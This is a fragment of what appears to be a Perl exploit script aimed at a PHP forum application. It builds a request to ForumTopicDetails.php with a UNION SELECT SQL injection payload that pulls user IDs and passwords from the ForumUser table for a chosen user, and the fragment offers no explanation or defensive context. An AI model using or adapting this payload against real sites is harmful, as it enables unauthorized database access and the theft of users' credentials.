...
print "\n#####################################################";
        ...
        $id=$ARGV[1];
$url =
"ForumTopicDetails.php?TopicID=-10%20union%20select%20userid,password,password,userid,joindate,4444444,4444444%20from%20ForumUser%20where%20user_index=$i
d";
            $site="$web/$url";
